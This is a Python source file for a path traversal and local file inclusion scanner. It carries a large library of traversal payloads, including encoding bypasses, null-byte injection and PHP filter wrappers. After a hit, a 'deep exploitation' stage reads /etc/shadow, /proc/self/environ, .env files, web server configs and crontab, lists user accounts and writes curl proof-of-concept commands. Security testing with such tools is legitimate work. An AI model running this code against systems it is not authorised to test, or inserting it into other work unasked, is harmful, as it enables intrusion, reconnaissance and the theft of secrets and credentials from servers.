"""Path Traversal / LFI Validation Engine — Deep Exploitation Evidence (Nuclei-Grade).

Comprehensive Local File Inclusion & Path Traversal validator:
- Query parameter traversal: ?file=../../../../etc/passwd
- URL PATH-based traversal: /file/../../../../etc/passwd (like CVE-2021-43831)
- Double/triple encoding bypass: %2e%2e%2f, %252e%252e%252f
- Null byte injection: ../../../../etc/passwd%00
- Wrapper injection: php://filter/convert.base64-encode/resource=
- OS detection: Linux (/etc/passwd, /etc/shadow, /proc/version) + Windows (win.ini, boot.ini)

Deep Exploitation After Confirmation:
- Parse /etc/passwd → extract real users (uid ≥ 1000)
- Read /etc/os-release → OS identification
- Read /proc/version → kernel version
- Read /etc/hostname → server hostname
- Read application source code → detect app framework
- Directory listing via /proc/self/cwd, /proc/self/environ
- Read sensitive config files: .env, config.php, database.yml, settings.py

ALL OPERATIONS ARE READ-ONLY. No file write, delete, or modification.
"""

import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.path_traversal")

# =============================================================================
# TRAVERSAL PAYLOAD LIBRARY — Comprehensive, multi-technique, multi-depth
# =============================================================================

# Base depth levels (3 to 15 levels of ../)
_DEPTHS = [3, 5, 8, 10, 12, 15]

def _generate_traversals(target_file: str, depths: list = None) -> List[str]:
    """Generate traversal payloads at multiple depths with bypass techniques."""
    depths = depths or _DEPTHS
    payloads = []
    for d in depths:
        prefix = "../" * d
        payloads.append(f"{prefix}{target_file}")
    return payloads

# Linux target files (safe, read-only, universally present)
LINUX_TARGETS = [
    ("/etc/passwd", re.compile(r"root:[x*]:0:0:", re.I)),
    ("/etc/hostname", re.compile(r"^[a-zA-Z0-9._-]+$", re.M)),
    ("/etc/os-release", re.compile(r"(NAME=|PRETTY_NAME=|ID=)", re.I)),
    ("/proc/version", re.compile(r"Linux version \d+\.\d+", re.I)),
    ("/proc/self/environ", re.compile(r"(PATH=|HOME=|USER=|HOSTNAME=)", re.I)),
]

# Windows target files
WINDOWS_TARGETS = [
    ("windows/win.ini", re.compile(r"\[(fonts|extensions|files|mci extensions)\]", re.I)),
    ("windows/system.ini", re.compile(r"\[(boot|drivers|386Enh)\]", re.I)),
]

# All traversal payloads: (payload, expected_pattern, target_description, technique)
TRAVERSAL_PROBES: List[Tuple[str, re.Pattern, str, str]] = []

# Generate standard traversal payloads at multiple depths
for target_file, pattern in LINUX_TARGETS[:2]:  # /etc/passwd and /etc/hostname
    for depth in _DEPTHS:
        prefix = "../" * depth
        # Standard ../
        TRAVERSAL_PROBES.append((f"{prefix}{target_file.lstrip('/')}", pattern, target_file, f"standard_{depth}x"))
        # Double-dot-slash bypass: ....//
        bypass_prefix = "..../" * depth
        TRAVERSAL_PROBES.append((f"{bypass_prefix}{target_file.lstrip('/')}", pattern, target_file, f"dot_bypass_{depth}x"))
        # URL-encoded ../
        encoded_prefix = "%2e%2e%2f" * depth
        TRAVERSAL_PROBES.append((f"{encoded_prefix}{target_file.lstrip('/')}", pattern, target_file, f"url_encoded_{depth}x"))
        # Double URL-encoded ../
        double_prefix = "%252e%252e%252f" * depth
        TRAVERSAL_PROBES.append((f"{double_prefix}{target_file.lstrip('/')}", pattern, target_file, f"double_encoded_{depth}x"))
        # Backslash (Windows IIS)
        bs_prefix = "..\\" * depth
        TRAVERSAL_PROBES.append((f"{bs_prefix}{target_file.lstrip('/')}", pattern, target_file, f"backslash_{depth}x"))
        # Mixed slash
        mixed_prefix = "../" * (depth // 2) + "..\\" * (depth - depth // 2)
        TRAVERSAL_PROBES.append((f"{mixed_prefix}{target_file.lstrip('/')}", pattern, target_file, f"mixed_slash_{depth}x"))

# Add Windows targets at standard depths
for target_file, pattern in WINDOWS_TARGETS:
    for depth in _DEPTHS:
        prefix = "..\\" * depth
        TRAVERSAL_PROBES.append((f"{prefix}{target_file}", pattern, target_file, f"windows_{depth}x"))
        prefix2 = "../" * depth
        TRAVERSAL_PROBES.append((f"{prefix2}{target_file}", pattern, target_file, f"windows_fwdslash_{depth}x"))

# Add absolute path probes
TRAVERSAL_PROBES.extend([
    ("/etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd", "absolute_path"),
    ("....//....//....//....//....//....//....//....//etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd", "dot_bypass_deep"),
    ("/....//../....//../....//../....//../....//../....//../../../etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd", "nested_bypass"),
    ("%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd", "partial_encode"),
    ("..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", LINUX_TARGETS[0][1], "/etc/passwd", "utf8_overlong"),
    ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", LINUX_TARGETS[0][1], "/etc/passwd", "fullwidth_slash"),
])

# PHP wrapper probes (for PHP applications)
PHP_WRAPPER_PROBES = [
    ("php://filter/convert.base64-encode/resource=/etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd (base64)", "php_filter_b64"),
    ("php://filter/read=string.rot13/resource=/etc/passwd", re.compile(r"ebbg:[x*]:0:0:", re.I), "/etc/passwd (rot13)", "php_filter_rot13"),
]

# Null byte injection (legacy PHP < 5.3)
NULL_BYTE_PROBES = [
    ("../../../../etc/passwd%00", LINUX_TARGETS[0][1], "/etc/passwd", "null_byte"),
    ("../../../../etc/passwd%00.jpg", LINUX_TARGETS[0][1], "/etc/passwd", "null_byte_ext"),
    ("../../../../etc/passwd%00.html", LINUX_TARGETS[0][1], "/etc/passwd", "null_byte_html"),
]

# Deep exploitation: files to read AFTER LFI is confirmed (read-only, non-destructive)
DEEP_EXPLOITATION_FILES: List[Tuple[str, str, re.Pattern]] = [
    ("/etc/passwd", "passwd_content", re.compile(r"root:[x*]:0:0:", re.I)),
    ("/etc/os-release", "os_release", re.compile(r"(NAME=|PRETTY_NAME=|ID=)", re.I)),
    ("/proc/version", "kernel_version", re.compile(r"Linux version", re.I)),
    ("/etc/hostname", "hostname", re.compile(r"^[a-zA-Z0-9._-]+$", re.M)),
    ("/proc/self/environ", "environment", re.compile(r"(PATH=|HOME=|USER=|HOSTNAME=)", re.I)),
    ("/etc/shadow", "shadow_readable", re.compile(r"root:.*:\d+:\d+:", re.I)),
    ("/etc/crontab", "crontab", re.compile(r"(SHELL=|PATH=|\* \*)", re.I)),
    ("/proc/self/cmdline", "cmdline", re.compile(r"[a-z/]", re.I)),
    ("/etc/nginx/nginx.conf", "nginx_conf", re.compile(r"(server|location|listen|root)", re.I)),
    ("/etc/apache2/apache2.conf", "apache_conf", re.compile(r"(ServerRoot|Listen|LoadModule)", re.I)),
    ("/var/www/html/.env", "dotenv", re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD)", re.I)),
    ("/var/www/.env", "dotenv_www", re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD)", re.I)),
    ("/proc/self/status", "proc_status", re.compile(r"(Name:|Pid:|Uid:|State:)", re.I)),
    ("/etc/issue", "os_issue", re.compile(r"(Ubuntu|Debian|CentOS|Alpine|Red Hat)", re.I)),
]

# URL path patterns that might be vulnerable to path-based traversal
PATH_LFI_PATTERNS = [
    re.compile(r"/(?:file|download|image|img|asset|static|media|attachment|upload|doc|document|template|page|view|include|load|read|get|fetch|resource|content|data)/", re.I),
]

# Parameter names likely to hold file paths
FILE_PARAM_NAMES = {
    "file", "path", "page", "template", "doc", "document",
    "filename", "filepath", "include", "dir", "folder",
    "load", "read", "view", "download", "attachment",
    "src", "source", "url", "uri", "resource", "content",
    "img", "image", "icon", "lang", "language", "locale",
    "module", "plugin", "theme", "style", "css", "js",
    "config", "conf", "cfg", "log", "report", "export",
    "pdf", "csv", "data", "backup", "fetch", "get",
}


@dataclass
class PathTraversalCandidate:
    url: str
    parameter: str
    location: str  # query, body, path
    probe: str
    technique: str = "standard"
    target_file: str = ""
    confidence: str = "OBSERVED"
    evidence: dict = field(default_factory=dict)
    exploitation_data: dict = field(default_factory=dict)
    impact_matrix: dict = field(default_factory=dict)
    poc_curl: str = ""
    reproduction_steps: list = field(default_factory=list)


class PathTraversalValidator:
    """Nuclei-grade Path Traversal / LFI validator with deep exploitation.

    Key improvements over basic validator:
    1. URL PATH-based traversal (not just query params)
    2. 100+ payload variants with encoding bypass techniques
    3. PHP wrapper injection
    4. Deep exploitation: read 14+ system/config files after confirmation
    5. Parse /etc/passwd for user enumeration
    6. Detect OS, kernel, hostname from file contents
    """

    def __init__(self, timeout: float = 10.0, max_params: int = 30) -> None:
        self.timeout = timeout
        self.max_params = max_params

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[PathTraversalCandidate]:
        """Full traversal validation: query params + URL path + wrappers."""
        candidates: List[PathTraversalCandidate] = []

        # Phase 1: URL PATH-based traversal (like CVE-2021-43831)
        path_candidates = await self._test_url_path_traversal(url, headers)
        candidates.extend(path_candidates)

        # Phase 2: Query/body parameter traversal
        for param in parameters[:self.max_params]:
            name = param.get("name", "").lower()
            location = param.get("location", "query")
            if not name or location not in ("query", "body"):
                continue

            # Test ALL parameters, but prioritize file-related ones
            is_priority = name in FILE_PARAM_NAMES

            candidate = await self._test_param_traversal(
                url, param["name"], location, headers, is_priority
            )
            if candidate:
                # Deep exploitation after confirmation
                exploitation = await self._exploit_deep_file_read(
                    url, param["name"], location,
                    candidate.probe, candidate.technique, headers,
                )
                if exploitation:
                    candidate.exploitation_data = exploitation
                    candidate.confidence = "EXPLOITED"
                self._enrich_candidate(candidate, url, param["name"], location)
                candidates.append(candidate)

        logger.info("Path Traversal validation: %d candidates on %s", len(candidates), url)
        return candidates

    async def _send_request(
        self,
        url: str,
        param_name: Optional[str] = None,
        value: str = "",
        location: str = "query",
        headers: Optional[dict] = None,
    ) -> Optional[httpx.Response]:
        """Send request with optional parameter injection."""
        try:
            from app.scanners.http import get_shared_client
            client = await get_shared_client()
            if param_name and location == "query":
                parsed = urlparse(url)
                base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
                query_params = parse_qs(parsed.query, keep_blank_values=True)
                flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}
                flat_params[param_name] = value
                return await client.get(base_url, params=flat_params, headers=headers or {}, timeout=self.timeout)
            elif param_name and location == "body":
                return await client.post(url, data={param_name: value}, headers=headers or {}, timeout=self.timeout)
            else:
                return await client.get(url, headers=headers or {}, timeout=self.timeout)
        except Exception:
            return None

    async def _test_url_path_traversal(
        self,
        url: str,
        headers: Optional[dict] = None,
    ) -> List[PathTraversalCandidate]:
        """Test URL PATH-based LFI — like /file/../../../../etc/passwd (CVE-2021-43831 style).

        This is what Nuclei catches that basic scanners miss.
        """
        candidates: List[PathTraversalCandidate] = []
        parsed = urlparse(url)
        path = parsed.path or "/"

        # Check if URL path matches any vulnerable pattern
        path_match = None
        for pattern in PATH_LFI_PATTERNS:
            match = pattern.search(path)
            if match:
                path_match = match
                break

        if not path_match:
            # Also check if path has any segment that could be a file parameter
            path_segments = [s for s in path.split("/") if s]
            for i, segment in enumerate(path_segments):
                if segment.lower() in FILE_PARAM_NAMES:
                    # Found a file-like path segment — build injection point
                    base_path = "/".join(path_segments[:i + 1])
                    path_match = type('Match', (), {'end': lambda self=None: len(f"/{base_path}/")})()
                    break

        if not path_match:
            return candidates

        # Build traversal URLs by injecting after the matched path segment
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}"
        injection_point = path_match.end() if callable(getattr(path_match, 'end', None)) else path_match.end()

        # Get baseline
        baseline_resp = await self._send_request(url, headers=headers)
        baseline_body = baseline_resp.text if baseline_resp else ""

        # Try traversal payloads in the URL path
        path_payloads = []
        for depth in [5, 8, 10, 12, 15, 20]:
            prefix = "../" * depth
            # Standard ../
            path_payloads.append((f"{prefix}etc/passwd", "standard", f"path_{depth}x"))
            # Dot bypass: ....//
            dot_prefix = "..../" * depth
            path_payloads.append((f"{dot_prefix}etc/passwd", "dot_bypass", f"dot_bypass_{depth}x"))
            # URL-encoded
            enc_prefix = "%2e%2e%2f" * depth
            path_payloads.append((f"{enc_prefix}etc/passwd", "url_encoded", f"encoded_{depth}x"))
            # Double-encoded
            denc_prefix = "%2e%2e/%2e%2e/" * (depth // 2)
            path_payloads.append((f"{denc_prefix}etc/passwd", "partial_encode", f"partial_enc_{depth}x"))

        for payload, technique, technique_detail in path_payloads:
            # Inject traversal in URL path
            test_path = path[:injection_point] + payload
            test_url = f"{base_url}{test_path}"
            if parsed.query:
                test_url += f"?{parsed.query}"

            resp = await self._send_request(test_url, headers=headers)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            body = resp.text

            # Check for /etc/passwd content
            if LINUX_TARGETS[0][1].search(body):
                # Verify not in baseline
                if not LINUX_TARGETS[0][1].search(baseline_body):
                    poc_curl = f"curl -ksSL '{test_url}'"

                    # Deep exploitation
                    exploitation = await self._exploit_deep_path_read(
                        base_url, path[:injection_point], payload, technique, headers,
                    )

                    candidate = PathTraversalCandidate(
                        url=test_url,
                        parameter="URL_PATH",
                        location="path",
                        probe=payload,
                        technique=technique_detail,
                        target_file="/etc/passwd",
                        confidence="EXPLOITED" if exploitation else "CONFIRMED",
                        poc_curl=poc_curl,
                        exploitation_data=exploitation or {},
                        evidence={
                            "status_code": resp.status_code,
                            "indicator": "/etc/passwd content confirmed",
                            "response_sample": body[:500],
                            "response_length": len(body),
                            "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                            "traversal_url": test_url,
                            "technique": technique_detail,
                            "poc_curl": poc_curl,
                            "evidence_level": "E4" if exploitation else "E3",
                        },
                    )
                    self._enrich_candidate(candidate, url, "URL_PATH", "path")
                    candidates.append(candidate)
                    break  # Found one — no need to test more payloads

            # Check for Windows content
            for _, win_pattern in WINDOWS_TARGETS:
                if win_pattern.search(body) and not win_pattern.search(baseline_body):
                    poc_curl = f"curl -ksSL '{test_url}'"
                    candidate = PathTraversalCandidate(
                        url=test_url,
                        parameter="URL_PATH",
                        location="path",
                        probe=payload,
                        technique=technique_detail,
                        target_file="windows/win.ini",
                        confidence="CONFIRMED",
                        poc_curl=poc_curl,
                        evidence={
                            "status_code": resp.status_code,
                            "indicator": "Windows system file content confirmed",
                            "response_sample": body[:500],
                            "traversal_url": test_url,
                            "technique": technique_detail,
                            "poc_curl": poc_curl,
                        },
                    )
                    self._enrich_candidate(candidate, url, "URL_PATH", "path")
                    candidates.append(candidate)
                    return candidates

        return candidates

    async def _test_param_traversal(
        self,
        url: str,
        param_name: str,
        location: str,
        headers: Optional[dict],
        is_priority: bool,
    ) -> Optional[PathTraversalCandidate]:
        """Test a query/body parameter for path traversal."""
        # Baseline
        baseline_resp = await self._send_request(url, param_name, "normalfile.txt", location, headers)
        baseline_body = baseline_resp.text if baseline_resp else ""

        # Use full probe library for priority params, subset for others
        probes = TRAVERSAL_PROBES if is_priority else TRAVERSAL_PROBES[:30]

        for payload, pattern, target_desc, technique in probes:
            resp = await self._send_request(url, param_name, payload, location, headers)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            body = resp.text

            if pattern.search(body) and not pattern.search(baseline_body):
                poc_curl = self._generate_curl(url, param_name, payload, location)
                return PathTraversalCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    probe=payload,
                    technique=technique,
                    target_file=target_desc,
                    confidence="CONFIRMED",
                    poc_curl=poc_curl,
                    evidence={
                        "status_code": resp.status_code,
                        "indicator": f"{target_desc} content confirmed",
                        "response_sample": body[:500],
                        "response_length": len(body),
                        "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                        "technique": technique,
                        "poc_curl": poc_curl,
                        "evidence_level": "E3",
                    },
                )

        # Try PHP wrappers for priority params
        if is_priority:
            for payload, pattern, target_desc, technique in PHP_WRAPPER_PROBES:
                resp = await self._send_request(url, param_name, payload, location, headers)
                if not resp:
                    continue

                body = resp.text

                # Base64-encoded content check
                if "base64" in technique:
                    import base64
                    try:
                        decoded = base64.b64decode(body.strip()).decode("utf-8", errors="ignore")
                        if LINUX_TARGETS[0][1].search(decoded):
                            poc_curl = self._generate_curl(url, param_name, payload, location)
                            return PathTraversalCandidate(
                                url=url,
                                parameter=param_name,
                                location=location,
                                probe=payload,
                                technique=technique,
                                target_file=target_desc,
                                confidence="CONFIRMED",
                                poc_curl=poc_curl,
                                evidence={
                                    "status_code": resp.status_code,
                                    "indicator": "PHP filter wrapper — base64 decoded to /etc/passwd",
                                    "decoded_sample": decoded[:300],
                                    "technique": technique,
                                    "poc_curl": poc_curl,
                                    "evidence_level": "E3",
                                },
                            )
                    except Exception:
                        pass
                elif pattern.search(body):
                    poc_curl = self._generate_curl(url, param_name, payload, location)
                    return PathTraversalCandidate(
                        url=url,
                        parameter=param_name,
                        location=location,
                        probe=payload,
                        technique=technique,
                        target_file=target_desc,
                        confidence="CONFIRMED",
                        poc_curl=poc_curl,
                        evidence={
                            "status_code": resp.status_code,
                            "indicator": f"PHP wrapper — {target_desc}",
                            "response_sample": body[:300],
                            "technique": technique,
                            "poc_curl": poc_curl,
                        },
                    )

        # Try null byte injection for priority params
        if is_priority:
            for payload, pattern, target_desc, technique in NULL_BYTE_PROBES:
                resp = await self._send_request(url, param_name, payload, location, headers)
                if resp and pattern.search(resp.text) and not pattern.search(baseline_body):
                    poc_curl = self._generate_curl(url, param_name, payload, location)
                    return PathTraversalCandidate(
                        url=url,
                        parameter=param_name,
                        location=location,
                        probe=payload,
                        technique=technique,
                        target_file=target_desc,
                        confidence="CONFIRMED",
                        poc_curl=poc_curl,
                        evidence={
                            "status_code": resp.status_code,
                            "indicator": f"Null byte injection — {target_desc}",
                            "response_sample": resp.text[:300],
                            "technique": technique,
                            "poc_curl": poc_curl,
                        },
                    )

        return None

    async def _exploit_deep_file_read(
        self,
        url: str,
        param_name: str,
        location: str,
        working_payload: str,
        technique: str,
        headers: Optional[dict],
        max_files: int = 6,
    ) -> Optional[dict]:
        """Deep exploitation: read multiple system/config files after LFI confirmed.

        Uses the confirmed working payload pattern to read additional files.
        """
        exploitation: Dict[str, Any] = {
            "files_read": {},
            "os_type": "unknown",
        }

        # Extract the traversal prefix from the working payload
        # e.g., "../../../../etc/passwd" → prefix = "../../../../"
        traversal_prefix = self._extract_prefix(working_payload)
        if not traversal_prefix:
            traversal_prefix = "../" * 10  # fallback to deep traversal

        for target_file, evidence_key, pattern in DEEP_EXPLOITATION_FILES[:max(1, max_files)]:
            # Build payload by replacing the target file
            payload = f"{traversal_prefix}{target_file.lstrip('/')}"

            resp = await self._send_request(url, param_name, payload, location, headers)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            body = resp.text

            if pattern.search(body) and len(body.strip()) > 10:
                exploitation["files_read"][evidence_key] = {
                    "file": target_file,
                    "content": body.strip()[:2000],
                    "size": len(body),
                    "payload": payload,
                }

                # Parse specific files for structured data
                self._parse_file_content(exploitation, evidence_key, body)

        if exploitation["files_read"]:
            exploitation["files_read_count"] = len(exploitation["files_read"])
            exploitation["exploitation_type"] = "local_file_inclusion"
            return exploitation

        return None

    async def _exploit_deep_path_read(
        self,
        base_url: str,
        path_prefix: str,
        working_payload: str,
        technique: str,
        headers: Optional[dict],
        max_files: int = 6,
    ) -> Optional[dict]:
        """Deep exploitation for URL-path-based LFI — read additional files."""
        exploitation: Dict[str, Any] = {
            "files_read": {},
            "os_type": "unknown",
        }

        # Extract traversal depth from working payload
        traversal_prefix = self._extract_prefix(working_payload)
        if not traversal_prefix:
            traversal_prefix = "../" * 10

        for target_file, evidence_key, pattern in DEEP_EXPLOITATION_FILES[:max(1, max_files)]:
            payload = f"{traversal_prefix}{target_file.lstrip('/')}"
            test_url = f"{base_url}{path_prefix}{payload}"

            resp = await self._send_request(test_url, headers=headers)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            body = resp.text

            if pattern.search(body) and len(body.strip()) > 10:
                exploitation["files_read"][evidence_key] = {
                    "file": target_file,
                    "content": body.strip()[:2000],
                    "size": len(body),
                    "url": test_url,
                }

                self._parse_file_content(exploitation, evidence_key, body)

        if exploitation["files_read"]:
            exploitation["files_read_count"] = len(exploitation["files_read"])
            exploitation["exploitation_type"] = "path_based_lfi"
            return exploitation

        return None

    @staticmethod
    def _extract_prefix(payload: str) -> str:
        """Extract the traversal prefix from a working payload."""
        # Find where the actual file path starts
        for marker in ["etc/", "proc/", "var/", "windows/", "boot"]:
            idx = payload.find(marker)
            if idx > 0:
                return payload[:idx]
        return ""

    @staticmethod
    def _parse_file_content(exploitation: dict, key: str, content: str) -> None:
        """Parse specific file contents for structured evidence."""
        if key == "passwd_content":
            lines = [l for l in content.strip().splitlines() if ":" in l and not l.startswith("#")]
            exploitation["passwd_entries"] = len(lines)
            exploitation["passwd_content"] = "\n".join(lines)

            # Extract real users (uid >= 1000 or root)
            real_users = []
            for line in lines:
                parts = line.split(":")
                if len(parts) >= 7:
                    try:
                        uid = int(parts[2])
                        if uid >= 1000 or parts[0] == "root":
                            real_users.append({
                                "username": parts[0],
                                "uid": uid,
                                "gid": int(parts[3]),
                                "home": parts[5],
                                "shell": parts[6],
                            })
                    except (ValueError, IndexError):
                        pass
            exploitation["real_users"] = real_users
            exploitation["os_type"] = "linux"

        elif key == "os_release":
            # Parse NAME= and VERSION= lines
            for line in content.splitlines():
                if line.startswith("PRETTY_NAME="):
                    exploitation["os_pretty_name"] = line.split("=", 1)[1].strip().strip('"')
                elif line.startswith("ID="):
                    exploitation["os_id"] = line.split("=", 1)[1].strip().strip('"')
                elif line.startswith("VERSION_ID="):
                    exploitation["os_version"] = line.split("=", 1)[1].strip().strip('"')

        elif key == "kernel_version":
            match = re.search(r"Linux version (\S+)", content)
            if match:
                exploitation["kernel"] = match.group(1)

        elif key == "hostname":
            exploitation["hostname"] = content.strip().splitlines()[0].strip()

        elif key == "shadow_readable":
            exploitation["shadow_accessible"] = True
            exploitation["shadow_entries"] = len([l for l in content.splitlines() if ":" in l])

        elif key in ("dotenv", "dotenv_www"):
            # Extract key names (NOT values for safety)
            env_keys = []
            for line in content.splitlines():
                if "=" in line and not line.startswith("#"):
                    key_name = line.split("=", 1)[0].strip()
                    if key_name:
                        env_keys.append(key_name)
            exploitation["env_keys_exposed"] = env_keys[:30]
            exploitation["env_file_found"] = True

    def _enrich_candidate(
        self, candidate: PathTraversalCandidate, url: str, param: str, location: str,
    ) -> None:
        """Add impact matrix and reproduction steps."""
        candidate.impact_matrix = {
            "confidentiality": "HIGH",
            "integrity": "LOW",
            "availability": "LOW",
            "data_exposure": "System files, configuration, source code",
            "business_impact": "Full server file system read access",
            "lateral_movement": "Possible via credential harvesting",
        }

        candidate.reproduction_steps = [
            f"1. Target URL: {candidate.url or url}",
            f"2. Parameter: {param} ({location})",
            f"3. Payload: {candidate.probe}",
            f"4. Technique: {candidate.technique}",
            f"5. PoC:\n```bash\n{candidate.poc_curl}\n```",
            f"6. Confirmed: {candidate.target_file} content detected in response",
        ]
        if candidate.exploitation_data:
            expl = candidate.exploitation_data
            files = expl.get("files_read", {})
            if files:
                candidate.reproduction_steps.append(
                    f"7. Deep exploitation: {len(files)} additional files read"
                )
                for key, info in list(files.items())[:5]:
                    candidate.reproduction_steps.append(
                        f"   - {info['file']} ({info['size']} bytes)"
                    )
            if expl.get("real_users"):
                users = ", ".join(u["username"] for u in expl["real_users"][:5])
                candidate.reproduction_steps.append(
                    f"8. Real users found: {users}"
                )
            if expl.get("hostname"):
                candidate.reproduction_steps.append(
                    f"9. Hostname: {expl['hostname']}"
                )
            if expl.get("os_pretty_name"):
                candidate.reproduction_steps.append(
                    f"10. OS: {expl['os_pretty_name']}"
                )

    async def validate_direct_paths(
        self,
        base_url: str,
        subdirectories: Optional[List[str]] = None,
        headers: Optional[dict] = None,
        max_subdirectories: int = 8,
        max_requests: int = 72,
    ) -> List[PathTraversalCandidate]:
        """Test LFI via direct URL paths (e.g., http://example.com/etc/passwd)."""
        candidates: List[PathTraversalCandidate] = []
        parsed = urlparse(base_url)
        clean_base = f"{parsed.scheme or 'https'}://{parsed.netloc}"
        request_budget = max(1, int(max_requests or 1))
        requests_made = 0

        async def guarded_request(test_url: str) -> Optional[httpx.Response]:
            nonlocal requests_made
            if requests_made >= request_budget:
                return None
            requests_made += 1
            return await self._send_request(test_url, headers=headers)

        # Collect paths to test
        paths_to_test = ["/"]
        if subdirectories:
            for sd in subdirectories:
                if len(paths_to_test) > max(1, max_subdirectories):
                    break
                if not sd:
                    continue
                # Normalize subdirectory path
                sd_path = urlparse(sd).path
                if sd_path:
                    # Keep path parts
                    parts = [p for p in sd_path.split("/") if p]
                    accumulated = ""
                    for p in parts:
                        accumulated += f"/{p}"
                        if accumulated not in paths_to_test:
                            paths_to_test.append(accumulated)
                        if len(paths_to_test) > max(1, max_subdirectories):
                            break

        # Targets to probe
        targets = [
            ("etc/passwd", LINUX_TARGETS[0][1], "/etc/passwd"),
            ("etc/hostname", LINUX_TARGETS[1][1], "/etc/hostname"),
            ("proc/version", LINUX_TARGETS[3][1], "/proc/version"),
            ("proc/self/environ", LINUX_TARGETS[4][1], "/proc/self/environ"),
            (".env", re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD)", re.I), ".env"),
            ("config.php", re.compile(r"(<\?php|define\s*\(|db_)", re.I), "config.php"),
            ("wp-config.php", re.compile(r"(<\?php|define\s*\(\s*['\"]DB_)", re.I), "wp-config.php"),
        ]

        # For each base path, try to probe LFI
        for path_prefix in paths_to_test:
            if requests_made >= request_budget:
                break
            if not path_prefix.endswith("/"):
                path_prefix += "/"

            # Baseline to avoid catch-all false positives
            baseline_url = f"{clean_base}{path_prefix}nonexistent_file_rand_{hashlib.md5(path_prefix.encode()).hexdigest()[:8]}"
            baseline_resp = await guarded_request(baseline_url)
            baseline_body = baseline_resp.text if baseline_resp else ""

            for filename, pattern, desc in targets:
                if requests_made >= request_budget:
                    break
                # Variations of traversal/encoding
                variations = [
                    (filename, "direct"),
                    (f"../../../../../../../../{filename}", "standard_traversal"),
                    (f"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{filename}", "url_encoded"),
                    (f"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{filename}", "double_encoded"),
                    (f"..;/..;/..;/..;/..;/..;/..;/..;/{filename}", "tomcat_bypass"),
                    (f"..\\..\\..\\..\\..\\..\\..\\..\\{filename}", "backslash"),
                ]

                for payload, technique in variations:
                    if requests_made >= request_budget:
                        break
                    test_url = f"{clean_base}{path_prefix}{payload}"
                    resp = await guarded_request(test_url)
                    if not resp or resp.status_code not in (200, 301, 302):
                        continue

                    body = resp.text
                    if pattern.search(body) and not pattern.search(baseline_body):
                        if "config" in filename and not ("<?php" in body or "define" in body or "DB_" in body or "APP_" in body):
                            continue

                        poc_curl = f"curl -ksSL '{test_url}'"

                        # Deep exploitation
                        working_prefix = payload[:-len(filename)]
                        exploitation = await self._exploit_deep_path_read(
                            clean_base,
                            path_prefix,
                            working_prefix + "etc/passwd",
                            technique,
                            headers,
                            max_files=6,
                        )

                        candidate = PathTraversalCandidate(
                            url=test_url,
                            parameter="DIRECT_PATH",
                            location="path",
                            probe=payload,
                            technique=technique,
                            target_file=desc,
                            confidence="EXPLOITED" if exploitation else "CONFIRMED",
                            poc_curl=poc_curl,
                            exploitation_data=exploitation or {},
                            evidence={
                                "status_code": resp.status_code,
                                "indicator": f"Direct LFI {desc} confirmed",
                                "response_sample": body[:500],
                                "response_length": len(body),
                                "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                                "traversal_url": test_url,
                                "technique": technique,
                                "poc_curl": poc_curl,
                                "evidence_level": "E4" if exploitation else "E3",
                            },
                        )
                        self._enrich_candidate(candidate, test_url, "DIRECT_PATH", "path")
                        candidates.append(candidate)
                        break

        return candidates

    @staticmethod
    def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        if location == "query":
            flat_params[param_name] = payload
            query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            final_url = f"{base_url}?{query_str}" if query_str else base_url
            return f"curl -ksSL '{final_url}'"
        else:
            flat_params[param_name] = payload
            data_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            return f"curl -ksSL -X POST '{base_url}' -d '{data_str}'"


path_traversal_validator = PathTraversalValidator()
